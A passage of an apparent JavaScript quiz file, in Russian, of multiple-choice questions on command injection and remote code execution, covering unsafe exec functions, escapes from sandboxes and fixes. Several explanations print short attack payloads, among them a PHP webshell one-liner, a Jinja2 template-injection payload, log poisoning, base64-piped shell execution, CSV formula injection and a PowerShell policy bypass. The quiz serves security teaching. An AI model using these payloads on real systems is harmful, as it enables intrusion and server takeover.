            "Права доступа на чтение (change root)",
            "Команда для смены пароля root",
            "Удаление root пользователя",
            "Перезагрузка в безопасный режим",
            "Шифрование корневого раздела",
            "Проверка целостности диска"
        ],
        correctAnswerIndex: 0,
        explanation: "`chroot /var/www` делает так, что процесс видит `/var/www` как `/`. Он не может выйти выше, к `/etc/passwd` реальной системы (в теории).",
        link: {
            label: "Chroot Jail",
            url: "https://en.wikipedia.org/wiki/Chroot"
        }
    },
    {
        question: "Можно ли выбраться из chroot (Chroot Breakout)?",
        answers: [
            "Да, если процесс имеет root права в chroot окружении, защита не абсолютна без дополнительных мер",
            "Нет, это физически невозможно",
            "Только если перезагрузить компьютер",
            "Только зная пароль BIOS",
            "Только через USB флешку",
            "Нет, chroot на 100% безопасен",
            "Да, но только в старых Linux 2.0"
        ],
        correctAnswerIndex: 0,
        explanation: "Если у процесса есть root внутри chroot, он может создать вложенный chroot и выбраться наружу.",
        link: {
            label: "Breaking out of chroot",
            url: "https://deepsec.net/docs/Slides/2015/Chroot_to_Root_-_Balazs_Bucsay.pdf"
        }
    },
    {
        question: "Что такое `docker escape`?",
        answers: [
            "Техника выхода из изолированного контейнера Docker на хост-систему",
            "Команда для остановки контейнера без сохранения данных",
            "Удаление образа Docker из репозитория",
            "Способ запуска контейнера в фоновом режиме",
            "Атака на реестр Docker Hub",
            "Автоматическое обновление контейнера",
            "Сброс сетевых настроек Docker"
        ],
        correctAnswerIndex: 0,
        explanation: "Если приложение в контейнере уязвимо к RCE и запущено с привилегиями (privileged mode) или имеет доступ к сокету Docker, возможен побег на хост.",
        link: {
            label: "Docker Breakout",
            url: "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout"
        }
    },
    {
        question: "Какой язык программирования исторически наиболее ассоциируется с Command Injection?",
        answers: [
            "Perl (в CGI скриптах) и PHP",
            "Java",
            "Rust",
            "Go",
            "Swift",
            "Kotlin",
            "Haskell"
        ],
        correctAnswerIndex: 0,
        explanation: "Perl и PHP часто использовались для написания 'клея' между вебом и системными утилитами, и имеют множество функций вызова оболочки.",
        link: {
            label: "CGI Security",
            url: "https://owasp.org/www-community/vulnerabilities/CGI_Script_Vulnerabilities"
        }
    },
    {
        question: "Что такое `eval()` injection?",
        answers: [
            "Выполнение произвольного кода языка через функцию eval(), что часто приводит к полной компрометации (как RCE)",
            "Ошибка вычисления математического выражения",
            "Инъекция в оценочную ведомость сотрудников",
            "Атака на систему рейтингов",
            "Метод оптимизации кода",
            "Функция для тестирования производительности",
            "Внедрение в комментарии"
        ],
        correctAnswerIndex: 0,
        explanation: "`eval()` исполняет строку как код. Если строка контролируется пользователем, это Code Injection, который почти всегда эквивалентен RCE.",
        link: {
            label: "Code Injection via Eval",
            url: "https://owasp.org/www-community/attacks/Code_Injection"
        }
    },
    {
        question: "Как проверить наличие уязвимости RCE без деструктивных действий?",
        answers: [
            "Использовать безопасные команды: `id`, `whoami`, `hostname`, `sleep`",
            "Использовать `rm -rf /`",
            "Использовать `reboot`",
            "Запустить майнер криптовалюты",
            "Попытаться удалить базу данных",
            "Изменить пароль администратора",
            "Отформатировать диск"
        ],
        correctAnswerIndex: 0,
        explanation: "Эти команды возвращают предсказуемый короткий результат и не меняют состояние системы.",
        link: {
            label: "Testing for Command Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection"
        }
    },
    {
        question: "Что такое `Java Runtime.exec()` и в чем его опасность?",
        answers: [
            "Метод запуска внешних процессов в Java. Опасен, если строка команды формируется конкатенацией пользовательського ввода",
            "Метод для запуска Java машины",
            "Способ компиляции кода на лету",
            "Функция для работы с регулярными выражениями",
            "Метод для остановки программы",
            "Устаревший метод, удаленный в Java 8",
            "Функция для работы с базами данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Особенно опасна форма `exec(String command)`, которая пытается разбить строку на аргументы, допуская инъекции в определенных условиях.",
        link: {
            label: "Java Runtime.exec pitfalls",
            url: "https://www.baeldung.com/java-runtime-exec"
        }
    },
    {
        question: "Как безопасно использовать `Runtime.exec()` в Java?",
        answers: [
            "Использовать перегрузку `exec(String[] cmdArray)`, передавая команду и аргументы как отдельные элементы массива",
            "Использовать `ProcessBuilder` с одной строкой",
            "Экранировать пробелы вручную",
            "Использовать `System.exit()`",
            "Запускать Java только в Windows",
            "Использовать `StringBuffer`",
            "Это невозможно, Java всегда уязвима"
        ],
        correctAnswerIndex: 0,
        explanation: "Передача массива строк предотвращает интерпретацию аргументов как части команды оболочкой.",
        link: {
            label: "Java ProcessBuilder Security",
            url: "https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html"
        }
    },
    {
        question: "Можно ли получить Command Injection в Node.js?",
        answers: [
            "Да, функции `child_process.exec()` и `child_process.spawn({shell: true})` используют оболочку ОС и уязвимы",
            "Нет, Node.js работает в V8 и изолирован",
            "Только если использовать устаревшие версии Node.js",
            "Только через npm пакеты",
            "Нет, JavaScript безопасный язык",
            "Только в браузере Chrome",
            "Да, но только в Deno"
        ],
        correctAnswerIndex: 0,
        explanation: "`exec` всегда запускает shell. `spawn` по умолчанию нет, но с опцией `shell: true` становится уязвимым.",
        link: {
            label: "Node.js Child Process",
            url: "https://nodejs.org/api/child_process.html"
        }
    },
    {
        question: "В чем разница между `execFile` и `exec` в Node.js?",
        answers: [
            "execFile выполняет файл напрямую (безопаснее, не запускает shell), exec запускает shell (опасно)",
            "execFile работает только с текстовыми файлами",
            "exec быстрее чем execFile",
            "execFile удаляет файл после исполнения",
            "Разницы нет, это алиасы",
            "execFile только для Windows",
            "exec возвращает Promise, execFile - нет"
        ],
        correctAnswerIndex: 0,
        explanation: "Если вам нужно просто запустить утилиту с аргументами, `execFile` предпочтительнее.",
        link: {
            label: "Node.js exec vs execFile",
            url: "https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"
        }
    },
    {
        question: "Что такое 'Wildcard expansion' (Globbing)?",
        answers: [
            "Автоматическое раскрытие оболочкой символов * и ? в список файлов. Может использоваться для манипуляции аргументами",
            "Расширение карты памяти",
            "Увеличение размера диска",
            "Атака на DNS wildcard записи",
            "Метод сжатия данных",
            "Тип SSL сертификата",
            "Бесконечный цикл в скрипте"
        ],
        correctAnswerIndex: 0,
        explanation: "Bash раскрывает `*` до запуска программы, передавая ей список файлов как аргументы.",
        link: {
            label: "Bash Globbing",
            url: "https://tldp.org/LDP/abs/html/globbingref.html"
        }
    },
    {
        question: "Как избежать уязвимостей Wildcard Injection в скриптах?",
        answers: [
            "Использовать `--` перед аргументом-именем файла (например, `tar cf archive.tar -- *`), чтобы утилита не воспринимала файлы как флаги",
            "Удалить все файлы в папке",
            "Переименовать все файлы вручную",
            "Использовать Windows вместо Linux",
            "Запретить использование символа * пользователям",
            "Запускать скрипт от root",
            "Экранировать звездочку двойным слешем"
        ],
        correctAnswerIndex: 0,
        explanation: "Символ `--` означает конец опций и флагов. Всё, что после него, считается позиционными аргументами (именами файлов).",
        link: {
            label: "Unix Utility Guidelines",
            url: "https://unix.stackexchange.com/questions/11376/what-does-double-dash-mean"
        }
    },
    {
        question: "Что такое `sed` injection?",
        answers: [
            "Инъекция в выражение sed, позволяющая выполнить команду через флаг `e` (execute) или функцию `e` в команде замены",
            "Внедрение в текстовый редактор",
            "Ошибка потока данных",
            "Атака на базу данных SED",
            "Подмена содержимого файла без ведома пользователя",
            "Сбой при кодировке UTF-8",
            "Нет такого"
        ],
        correctAnswerIndex: 0,
        explanation: "GNU sed имеет расширение `e`, которое позволяет выполнять команду оболочки. `sed 's/x/x/e'` выполнит x как команду.",
        link: {
            label: "GNU sed 'e' command",
            url: "https://www.gnu.org/software/sed/manual/html_node/The-s-Command.html"
        }
    },
    {
        question: "Может ли Command Injection произойти через HTTP заголовок Host?",
        answers: [
            "Да, если сервер использует его в скриптах (например, для роутинга или формирования логов) через небезопасный вызов",
            "Нет, заголовок Host проверяется браузером",
            "Только если сайт работает по HTTP/2",
            "Только в IIS серверах",
            "Только если заголовок длиннее 256 байт",
            "Нет, заголовки не попадают в командную строку",
            "Да, но только при ответе 404"
        ],
        correctAnswerIndex: 0,
        explanation: "Пример: скрипт берет Host для формирования конфига nginx и перезагружает его командой `system('generate_conf ' . $_SERVER['HTTP_HOST'])`.",
        link: {
            label: "Host Header Injection",
            url: "https://portswigger.net/web-security/host-header"
        }
    },
    {
        question: "Чем опасен доступ к файлу `/etc/shadow` при эксплуатации RCE?",
        answers: [
            "Он содержит хеши паролей пользователей. Их можно попытаться сбрутить (hashcat) и получить доступ к системе",
            "Он содержит SSL ключи сервера",
            "Он хранит историю команд",
            "Это файл конфигурации сети",
            "Он содержит куки пользователей",
            "В нем хранятся удаленные файлы",
            "Это просто текстовый файл без важности"
        ],
        correctAnswerIndex: 0,
        explanation: "В отличие от `/etc/passwd`, доступ к `/etc/shadow` есть только у root. Его чтение — признак серьезной компрометации (Privilege Escalation).",
        link: {
            label: "Linux Shadow File",
            url: "https://man7.org/linux/man-pages/man5/shadow.5.html"
        }
    },
    {
        question: "Как можно просканировать внутреннюю сеть, имея только Blind RCE?",
        answers: [
            "Написать однострочный скрипт (bash for loop + ping/nc) и запустить его на сервере",
            "Это невозможно без GUI",
            "Запросить карту сети у админа",
            "Только установив Nmap",
            "Используя команду `netstat -scan`",
            "Через браузер жертвы",
            "Подобрать IP адреса вручную"
        ],
        correctAnswerIndex: 0,
        explanation: "`for i in {1..254}; do ping -c 1 192.168.1.$i && echo $i UP; done`. Это медленно, но работает.",
        link: {
            label: "Network Recon via Command Inj",
            url: "https://recipeforroot.com/internal-network-pivoting/"
        }
    },
    {
        question: "Что понимается под термином `Webshell`?",
        answers: [
            "Вредоносный скрипт, загруженный на сервер, предоставляющий удаленный интерфейс (часто GUI) для выполнения команд",
            "Оболочка веб-браузера",
            "Официальная панель администратора хостинга",
            "Инструмент разработчика в Chrome",
            "Сайт, написанный на Shell",
            "Защитная оболочка сайта",
            "Фреймворк для веб-разработки"
        ],
        correctAnswerIndex: 0,
        explanation: "Популярные примеры: c99, r57, China Chopper. Они позволяют browsing файлов, выполнение SQL и CMD.",
        link: {
            label: "Web Shells",
            url: "https://www.us-cert.gov/ncas/alerts/TA15-314A"
        }
    },
    {
        question: "Как можно создать Webshell на сервере, используя Command Injection?",
        answers: [
            "Используя `echo` или `printf` для записи кода в файл в доступной для записи веб-директории",
            "Командой `download shell`",
            "Через SQL запрос `CREATE TABLE shell`",
            "Командой `mount shell`",
            "Это невозможно, CI не дает записи файлов",
            "Только если открыт FTP порт",
            "Через отправку SMS"
        ],
        correctAnswerIndex: 0,
        explanation: "`echo '<?php system($_GET[c]); ?>' > shell.php`.",
        link: {
            label: "Writing Web Shells",
            url: "https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/"
        }
    },
    {
        question: "Может ли WAF заблокировать выполнение команды из-за её длины?",
        answers: [
            "Да, некоторые WAF ограничивают длину параметров. Обойти можно, записывая команду по частям в файл",
            "Нет, длина не имеет значения",
            "WAF проверяет только куки",
            "Всегда блокирует больше 10 символов",
            "Только если команда длиннее 1 Мб",
            "Нет, это миф",
            "Блокирует только короткие команды"
        ],
        correctAnswerIndex: 0,
        explanation: "Техника посимвольной записи: `echo -n c > f`, `echo -n a >> f`, `echo -n t >> f`, `sh f`.",
        link: {
            label: "Command Injection Size Restrictions",
            url: "https://ctf-wiki.org/web/command-injection/"
        }
    },
    {
        question: "Что такое 'Fileless RCE'?",
        answers: [
            "Выполнение вредоносного кода/команд только в оперативной памяти без записи файлов на диск",
            "RCE без использования файлов .exe",
            "RCE через облачные сервисы",
            "Атака на беспроводные сети",
            "Удаление всех файлов на сервере",
            "RCE, которое не оставляет логов",
            "Взлом выключенного компьютера"
        ],
        correctAnswerIndex: 0,
        explanation: "Это усложняет криминалистический анализ (forensics), так как после перезагрузки следы исчезают.",
        link: {
            label: "Fileless Malware",
            url: "https://www.crowdstrike.com/cybersecurity-101/malware/fileless-malware/"
        }
    },
    {
        question: "В каких случаях `subprocess.run` в Python может быть уязвим?",
        answers: [
            "Если установлен параметр `shell=True` и аргументы команды контролируются пользователем",
            "Всегда, это опасная функция",
            "Никогда, Python безопасен по умолчанию",
            "Только если `shell=False`",
            "Только в Python 2.7",
            "Если аргументы передаются списком",
            "Только при запуске от root"
        ],
        correctAnswerIndex: 0,
        explanation: "`shell=True` вызывает `/bin/sh -c <cmd>`, что открывает возможность использования метасимволов оболочки.",
        link: {
            label: "Python Subprocess Security",
            url: "https://docs.python.org/3/library/subprocess.html#security-considerations"
        }
    },
    {
        question: "Что такое `Ruby open()` injection?",
        answers: [
            "В старых версиях Ruby (2.x), метод `open()` из модуля Kernel выполнял команду, если строка начиналась с `|`",
            "Уязвимость открытия двери офиса через Ruby",
            "Метод для открытия файлов с правами root",
            "Уязвимость в базах данных Oracle",
            "Атака на OpenSSL через Ruby",
            "Переполнение буфера в интерпретаторе",
            "Такого не бывает"
        ],
        correctAnswerIndex: 0,
        explanation: "`open(\"|whoami\")` в Ruby выполнял команду и возвращал IO поток с результатом.",
        link: {
            label: "Ruby Command Injection",
            url: "https://brakemanscanner.org/docs/warning_types/command_injection/"
        }
    },
    {
        question: "Что такое `Perl open()` injection?",
        answers: [
            "Аналогично Ruby, `open(FH, $input)` в Perl уязвим, если $input содержит пайп `|`",
            "Жемчужная инъекция",
            "Особенность работы с файлами в Perl",
            "Специальный модуль Perl для пентеста",
            "Метод открытия сокетов",
            "Уязвимость в модуле CGI.pm",
            "Нет уязвимости"
        ],
        correctAnswerIndex: 0,
        explanation: "Perl 'магически' обрабатывает аргументы open, позволяя запускать процессы.",
        link: {
            label: "Perl Security",
            url: "https://perldoc.perl.org/perlsec#Security-Bugs-in-Non-obvious-Places"
        }
    },
    {
        question: "Как исправить уязвимость Ruby `open()`?",
        answers: [
            "Использовать `File.open` для файлов или `IO.popen` (с массивом аргументов) для процессов",
            "Не использовать Ruby",
            "Удалить функцию open",
            "Использовать close сразу после open",
            "Обновить Ruby до версии 3.0",
            "Экранировать все пробелы",
            "Запретить пайпы"
        ],
        correctAnswerIndex: 0,
        explanation: "`File.open` работает только с файловой системой и не интерпретирует пайпы как команды.",
        link: {
            label: "Ruby Secure Coding",
            url: "https://docs.ruby-lang.org/en/master/File.html#method-c-open"
        }
    },
    {
        question: "Входит ли Command Injection в рейтинг OWASP Top 10?",
        answers: [
            "Да, в категорию 'A03:2021-Injection'",
            "Нет, это слишком редкая уязвимость",
            "Был, но его объединили с XSS",
            "Только в мобильный Top 10",
            "Да, но на последнем месте",
            "Нет, это проблема операционных систем, а не веб-приложений",
            "Да, как A01-Broken Access Control"
        ],
        correctAnswerIndex: 0,
        explanation: "Категория Injection включает в себя SQLi, NoSQLi, Command Injection и LDAP Injection.",
        link: {
            label: "OWASP Top 10 Injection",
            url: "https://owasp.org/Top10/A03_2021-Injection/"
        }
    },
    {
        question: "Что такое 'Command Injection via SSI' (Server Side Includes)?",
        answers: [
            "Внедрение директив SSI (<!--#exec cmd='ls' -->) в HTML страницы с расширением .shtml",
            "Инъекция в SSL сертификаты",
            "Атака на SSH ключи",
            "Внедрение скриптов на стороне сервера (JS)",
            "Подмена содержимого CSS",
            "Атака на Smart TV",
            "Перехват спутникового сигнала"
        ],
        correctAnswerIndex: 0,
        explanation: "Если сервер настроен парсить SSI в пользовательском вводе (крайне редкая конфигурация сейчас), возможен RCE.",
        link: {
            label: "OWASP SSI Injection",
            url: "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection"
        }
    },
    {
        question: "Как защитить SSI от инъекций?",
        answers: [
            "Отключить директиву `exec` в конфигурации веб-сервера или не использовать SSI для обработки User Input",
            "Включить SSI на всех страницах",
            "Удалить расширение .shtml",
            "Использовать HTTPS",
            "Проверять длину запроса",
            "Установить антивирус",
            "Ничего, SSI безопасен"
        ],
        correctAnswerIndex: 0,
        explanation: "В Apache это делается опцией `Options +IncludesNoExec`.",
        link: {
            label: "Apache Module mod_include",
            url: "https://httpd.apache.org/docs/2.4/mod/mod_include.html"
        }
    },
    {
        question: "Можно ли получить RCE через Deserialization (Insecure Deserialization)?",
        answers: [
            "Да, часто `gadget chains` в уязвимых библиотеках заканчиваются выполнением команд (Runtime.exec)",
            "Нет, десериализация только восстанавливает объекты",
            "Только в Java",
            "Только в PHP",
            "Только если объект больше 1 Кб",
            "Нет, это приводит только к DoS",
            "Да, но только в Python pickle"
        ],
        correctAnswerIndex: 0,
        explanation: "Самая известная уязвимость такого типа — Apache Struts RCE (Equifax breach), где десериализация XML вела к выполнению команд.",
        link: {
            label: "OWASP Insecure Deserialization",
            url: "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
        }
    },
    {
        question: "Какая основная (корневая) причина возникновения Command Injection?",
        answers: [
            "Недоверенный пользовательский ввод передается в системную оболочку без должной валидации и экранирования",
            "Использование старых языков программирования",
            "Отсутствие HTTPS",
            "Ошибки в ядре Linux",
            "Использование Windows Server",
            "Злонамеренные действия администратора",
            "Слишком большая нагрузка на сервер"
        ],
        correctAnswerIndex: 0,
        explanation: "Корень проблемы всегда в нарушении границы между данными (ввод пользователя) и кодом (команда оболочки).",
        link: {
            label: "CWE-78: OS Command Injection",
            url: "https://cwe.mitre.org/data/definitions/78.html"
        }
    },
    {
        question: "Помогает ли принцип 'least privilege' (наименьших привилегий) против Command Injection?",
        answers: [
            "Не предотвращает уязвимость, но ограничивает ущерб (нельзя прочитать /etc/shadow, нельзя писать в системные папки)",
            "Да, полностью защищает от инъекции",
            "Нет, он бесполезен",
            "Только в корпоративных сетях",
            "Нет, он только усложняет администрирование",
            "Да, хакер не сможет зайти на сайт",
            "Помогает только от SQL инъекций"
        ],
        correctAnswerIndex: 0,
        explanation: "RCE всё равно произойдет, но атакующий будет ограничен правами пользователя `www-data`, а не `root`.",
        link: {
            label: "Least Privilege Principle",
            url: "https://csrc.nist.gov/glossary/term/least_privilege"
        }
    },
    {
        question: "Можно ли использовать утилиту `dd` для записи файла?",
        answers: [
            "Да, `dd if=source of=dest`. Полезно, если перенаправление `>` фильтруется",
            "Нет, dd только для создания образов дисков",
            "Только для бэкапа",
            "Это удаляет данные, а не пишет",
            "Только если есть права root",
            "Только на магнитных лентах",
            "Нет, dd слишком медленный"
        ],
        correctAnswerIndex: 0,
        explanation: "`echo 'content' | dd of=/tmp/file` — способ обойти фильтр на символ `>`.",
        link: {
            label: "Man page: dd",
            url: "https://man7.org/linux/man-pages/man1/dd.1.html"
        }
    },
    {
        question: "Что такое `base64` в контексте эксплуатации Command Injection?",
        answers: [
            "Способ передать бинарные данные или сложные команды без использования спецсимволов. `echo <base64> | base64 -d | sh`",
            "Метод шифрования данных АНБ",
            "Кодировка для email",
            "Хеширование паролей",
            "Сжатие изображений",
            "Протокол передачи файлов",
            "База данных на 64 бита"
        ],
        correctAnswerIndex: 0,
        explanation: "Base64 содержит только буквенно-цифровые символы, что позволяет пронести пейлоад через жесткие фильтры спецсимволов.",
        link: {
            label: "Base64 Encoding",
            url: "https://en.wikipedia.org/wiki/Base64"
        }
    },
    {
        question: "Что такое XXE (XML External Entity) и может ли оно привести к RCE?",
        answers: [
            "Уязвимость парсера XML. В PHP (через expect module) или Java (редко) может привести к RCE, но чаще к чтению файлов",
            "Всегда приводит к RCE",
            "Это ошибка в Excel",
            "Только для кражи cookies",
            "Это XSS в XML",
            "Атака на базы данных XML",
            "Нет, XXE безопасен"
        ],
        correctAnswerIndex: 0,
        explanation: "Если включен модуль `expect` в PHP, URI `expect://id` в XXE выполнит команду `id`.",
        link: {
            label: "XXE to RCE",
            url: "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#rce"
        }
    },
    {
        question: "Что такое SSTI (Server-Side Template Injection)?",
        answers: [
            "Внедрение в шаблонизаторы (Jinja2, FreeMarker). Часто приводит к RCE, так как движки шаблонов имеют доступ к функциям языка",
            "Стилизация CSS на сервере",
            "Инъекция в HTML шаблоны на клиенте",
            "Атака на SSL сертификаты",
            "Ошибка верстки",
            "Внедрение SQL в шаблоны",
            "Нет такого"
        ],
        correctAnswerIndex: 0,
        explanation: "Пример: `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` в Jinja2 (Python).",
        link: {
            label: "SSTI Payloads",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
        }
    },
    {
        question: "Как Log Poisoning (отравление логов) может привести к RCE?",
        answers: [
            "Если атакующий запишет PHP код в лог (через User-Agent), а потом включит этот лог через LFI (Local File Inclusion)",
            "Это невозможно",
            "Логи занимают всё место на диске (DoS)",
            "Админ прочитает лог и заразится",
            "Через переполнение буфера syslog",
            "Блокировкой IP адреса",
            "Подменой времени в логах"
        ],
        correctAnswerIndex: 0,
        explanation: "Классическая связка LFI + Log Poisoning: `GET / <?php system($_GET['c']); ?>` -> `/var/log/apache2/access.log`.",
        link: {
            label: "LFI to RCE via Log Poisoning",
            url: "https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-apache-log-poisoning"
        }
    },
    {
        question: "В чем опасность использования `/proc/self/environ` при LFI?",
        answers: [
            "Этот файл содержит переменные окружения процесса (в т.ч. User-Agent). Через LFI его можно исполнить как PHP код",
            "Это раскрывает пароли пользователей",
            "Это показывает процессы ядра",
            "Это удаляет сервер",
            "Файл недоступен никому",
            "Это вызывает kernel panic",
            "Это показывает версию BIOS"
        ],
        correctAnswerIndex: 0,
        explanation: "Еще один вектор LFI to RCE. Атакующий шлет запрос с вредоносным User-Agent и инклюдит `/proc/self/environ`.",
        link: {
            label: "Shell via LFI /proc/self/environ",
            url: "https://www.exploit-db.com/papers/12992"
        }
    },
    {
        question: "Что такое 'Zip Slip'?",
        answers: [
            "Уязвимость при распаковке архивов (Directory Traversal). Позволяет перезаписать критические файлы (например, .ssh/authorized_keys) и получить RCE",
            "Ошибка сжатия ZIP",
            "Потеря пароля от архива",
            "Медленная распаковка",
            "Проскальзывание битов",
            "Ошибка CRC суммы",
            "Скрытые файлы в архиве"
        ],
        correctAnswerIndex: 0,
        explanation: "Если архив содержит файл с именем `../../evil.sh`, распаковщик может записать его за пределы целевой папки.",
        link: {
            label: "Snyk: Zip Slip Vulnerability",
            url: "https://snyk.io/research/zip-slip-vulnerability/"
        }
    },
    {
        question: "Почему Electron приложения могут быть уязвимы к RCE?",
        answers: [
            "Если включена `nodeIntegration: true` и отображается удаленный контент (XSS), JS со страницы получает доступ к Node.js API (fs, child_process)",
            "Electron написан на Java",
            "Они используют слишком много памяти",
            "Из-за старых версий Chrome",
            "Потому что это десктопные приложения",
            "Из-за отсутствия шифрования",
            "Electron безопасен по умолчанию"
        ],
        correctAnswerIndex: 0,
        explanation: "XSS в Electron с включенной интеграцией Node.js превращается в RCE мгновенно.",
        link: {
            label: "Electron Security Guidelines",
            url: "https://www.electronjs.org/docs/latest/tutorial/security"
        }
    },
    {
        question: "Как LaTeX Injection может привести к RCE?",
        answers: [
            "Через команды `\write18` или `\input`, которые позволяют выполнять системные команды при компиляции документа",
            "Через вставку картинок",
            "Через переполнение шрифтов",
            "LaTeX безопасен, это система верстки",
            "Через макросы Word",
            "Только в PDF файлах",
            "Через формулы"
        ],
        correctAnswerIndex: 0,
        explanation: "LaTeX — это мощная система, позволяющая взаимодействие с ОС. `\immediate\write18{ls > output}`.",
        link: {
            label: "Hacking with LaTeX",
            url: "https://0day.work/hacking-with-latex/"
        }
    },
    {
        question: "Что такое CSV Injection (Formula Injection)?",
        answers: [
            "Внедрение формул (=cmd|' /C calc' !A0) в CSV файл. При открытии в Excel выполняется команда",
            "Инъекция разделителей запятых",
            "SQL инъекция в CSV",
            "Повреждение файла таблицы",
            "Изменение цен в прайс-листе",
            "Удаление строк таблицы",
            "Нет, это миф"
        ],
        correctAnswerIndex: 0,
        explanation: "Это 'Client-Side' Command Injection. Атака на пользователя, который открывает файл.",
        link: {
            label: "CSV Injection",
            url: "https://owasp.org/www-community/attacks/CSV_Injection"
        }
    },
    {
        question: "В чем опасность PDF генераторов на базе Webkit (wkhtmltopdf)?",
        answers: [
            "Они могут быть уязвимы к SSRF (чтение файлов через file://) и XSS, что иногда ведет к LFI/RCE",
            "Они создают большие PDF",
            "Плохо отображают шрифты",
            "Требуют лицензии",
            "Только для Windows",
            "Не поддерживают CSS",
            "Они безопасны"
        ],
        correctAnswerIndex: 0,
        explanation: "Если генератор PDF выполняется на сервере и рендерит пользовательский HTML, векторов атаки множество.",
        link: {
            label: "SSRF/LFI in PDF Generators",
            url: "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf"
        }
    },
    {
        question: "В чем опасность `git clone --recurse-submodules` с недоверенного репозитория?",
        answers: [
            "В прошлом были уязвимости (CVE-2018-11235), позволяющие RCE через конфиг подмодулей",
            "Git занимает много места",
            "Репозиторий может быть удален",
            "Это долго",
            "Это безопасно",
            "Git не умеет выполнять код",
            "Только в SVN"
        ],
        correctAnswerIndex: 0,
        explanation: "Git — сложная система. Уязвимости в клиенте Git периодически находятся и позволяют RCE при клонировании.",
        link: {
            label: "Git CVE-2018-11235",
            url: "https://www.edwardthomson.com/blog/upgrading_git_for_cve_2018_11235.html"
        }
    },
    {
        question: "Как `ffmpeg` может использоваться для кражи файлов (LFI)?",
        answers: [
            "Через HLS (m3u8) плейлисты, ссылающиеся на локальные файлы. ffmpeg конвертирует их содержимое в видео",
            "Через громкий звук",
            "Через метаданные видео",
            "Через субтитры",
            "FFmpeg безопасен",
            "Только в MP4",
            "Только в AVI"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий загружает плейлист, указывающий на `/etc/passwd`. Ffmpeg читает файл и вставляет текст в кадры видео.",
        link: {
            label: "FFmpeg SSRF/LFI",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ffmpeg-hls-processing"
        }
    },
    {
        question: "Что такое Gopher протокол и его роль в SSRF -> RCE?",
        answers: [
            "Протокол, позволяющий отправлять почти произвольные байты в TCP соединение. Позволяет общаться с Redis, Memcached, SMTP внутри сети",
            "Протокол для поиска сусликов",
            "Старая версия HTTP",
            "Протокол шифрования",
            "Сетевой экран",
            "Браузер",
            "Почтовый клиент"
        ],
        correctAnswerIndex: 0,
        explanation: "Через `gopher://127.0.0.1:6379/_...payload...` можно отправить команды Redis и получить RCE.",
        link: {
            label: "Gopher SSRF",
            url: "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher"
        }
    },
    {
        question: "Как получить RCE через Redis (без аутентификации)?",
        answers: [
            "Записать Webshell в папку веб-сервера через команды `CONFIG SET dir` и `save`",
            "Redis сам выполняет PHP код",
            "Через переполнение ключей",
            "Это невозможно",
            "Только в Redis 2.0",
            "Удалить все ключи",
            "Подменить пароль root"
        ],
        correctAnswerIndex: 0,
        explanation: "Redis позволяет сохранять базу данных на диск. Если сохранить её как `shell.php` в `/var/www/html`, сервер исполнит её.",
        link: {
            label: "Redis RCE",
            url: "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce"
        }
    },
    {
        question: "Как работает атака PHP-FPM RCE (CVE-2019-11043)?",
        answers: [
            "Через переполнение буфера в fastcgi_split_path_info в Nginx+PHP-FPM, позволяющее записывать в память процесса PHP",
            "Через SQL инъекцию",
            "Через загрузку файлов",
            "Ошибка в WordPress",
            "Слабый пароль PHP",
            "Открытый порт 9000",
            "Это XSS"
        ],
        correctAnswerIndex: 0,
        explanation: "Довольно сложная бинарная эксплуатация, но вектор атаки — через веб-запросы к скриптам.",
        link: {
            label: "PHP-FPM RCE Explanation",
            url: "https://lab.wallarm.com/php-fpm-exploitation-cve-2019-11043/"
        }
    },
    {
        question: "В чем разница между `shell_exec` и `exec` в PHP по возвращаемому значению?",
        answers: [
            "shell_exec возвращает весь вывод команды (string), exec возвращает только последнюю строку (output array передается по ссылке)",
            "Наоборот",
            "Они одинаковы",
            "shell_exec безопаснее",
            "exec не возвращает ничего",
            "shell_exec возвращает true/false",
            "exec работает только в консоли"
        ],
        correctAnswerIndex: 0,
        explanation: "Если вы не видите вывод (Blind), возможно используется `exec` без захвата вывода.",
        link: {
            label: "PHP shell_exec vs exec",
            url: "https://www.php.net/manual/en/function.shell-exec.php"
        }
    },
    {
        question: "Что произойдет в Windows cmd, если ввести `%USERNAME%`?",
        answers: [
            "Оболочка раскроет переменную окружения и подставит имя текущего пользователя",
            "Ничего, это просто текст",
            "Ошибка синтаксиса",
            "Компьютер перезагрузится",
            "Откроется браузер",
            "Появится калькулятор",
            "Удалится пользователь"
        ],
        correctAnswerIndex: 0,
        explanation: "Переменные окружения в Windows обрамляются `%`. В PowerShell — `$env:USERNAME`.",
        link: {
            label: "Windows Environment Variables",
            url: "https://ss64.com/nt/syntax-variables.html"
        }
    },
    {
        question: "Как обойти `ExecutionPolicy` в PowerShell для запуска скрипта?",
        answers: [
            "powershell -ExecutionPolicy Bypass -File script.ps1",
            "Это невозможно, политика безопасности блокирует",
            "Нужны права админа",
            "Переименовать в .exe",
            "Скомпилировать скрипт",
            "Удалить PowerShell",
            "Только в Windows Server"
        ],
        correctAnswerIndex: 0,
        explanation: "ExecutionPolicy — это защита от дурака (user safety), а не граница безопасности (security boundary). Обойти её тривиально.",
        link: {
            label: "Bypassing Execution Policy",
            url: "https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/"
        }
    },
    {
        question: "Что такое Python Pickle RCE?",
        answers: [
            "Уязвимость десериализации в модуле pickle. Метод `__reduce__` позволяет выполнить произвольный код при загрузке объекта",
            "Маринованный огурец",
